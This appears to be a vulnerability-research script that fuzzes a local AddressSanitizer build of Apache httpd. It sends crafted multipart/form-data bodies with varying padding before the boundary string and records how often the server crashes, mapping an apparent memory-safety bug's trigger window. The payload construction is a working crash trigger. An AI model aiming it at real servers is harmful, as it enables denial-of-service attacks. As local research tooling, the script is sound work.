#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""确定性边界实验：对 pad 0..20 各发 5 次，统计崩溃率，验证 distance=4+pad<=7 的触发窗口"""
import os, socket, subprocess, time, json

PREFIX = "/opt/httpd-asan"
CONF = PREFIX + "/conf/httpd-44790.conf"
ERRLOG = PREFIX + "/logs/error_log"
OUT = "/mnt/e/强网拟态/Apache项目/漏洞挖掘/fuzz"
HOST = ("127.0.0.1", 8082)

def sh(c):
    return subprocess.run(c, shell=True, capture_output=True, text=True)

def start():
    sh("pkill -9 -f httpd-asan"); time.sleep(0.3)
    subprocess.Popen([PREFIX + "/bin/httpd", "-f", CONF, "-DFOREGROUND"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
    for _ in range(100):
        try:
            s = socket.create_connection(HOST, 0.2); s.close(); return True
        except OSError:
            time.sleep(0.1)
    return False

def send(body):
    bnd = body[2:body.find(b"\r\n")]
    req = (b"POST /parsebody HTTP/1.1\r\nHost: 127.0.0.1\r\n"
           b"Content-Type: multipart/form-data; boundary=" + bnd + b"\r\n"
           b"Content-Length: " + str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
    try:
        s = socket.create_connection(HOST, 2); s.settimeout(1.5)
        s.sendall(req)
        while True:
            c = s.recv(4096)
            if not c: break
        s.close()
    except Exception:
        pass

def crashed():
    try:
        t = open(ERRLOG, "rb").read()[-200000:]
        return (b"AddressSanitizer" in t) or (b"exit signal" in t)
    except Exception:
        return False

table = []
def ensure_alive():
    try:
        s = socket.create_connection(HOST, 0.3); s.close(); return
    except OSError:
        start()

for pad in range(0, 21):
    crashes = 0
    for _ in range(5):
        ensure_alive()
        sh(": > %s" % ERRLOG)
        b = b"BOUNDARY"
        body = b"--" + b + b"\r\nContent-Disposition: form-data; name=\"x\"; filename=\"y\"\r\n\r\n" + b"A"*pad + b + b"--\r\n"
        send(body)
        time.sleep(0.15)
        if crashed():
            crashes += 1
            start()
    table.append({"pad": pad, "distance": 4+pad, "crashes": crashes, "trials": 5})
    print("pad=%2d distance=%2d crashes=%d/5" % (pad, 4+pad, crashes))

json.dump(table, open(os.path.join(OUT, "boundary-experiment.json"), "w"), indent=1)
sh("pkill -9 -f httpd-asan")
print("done")
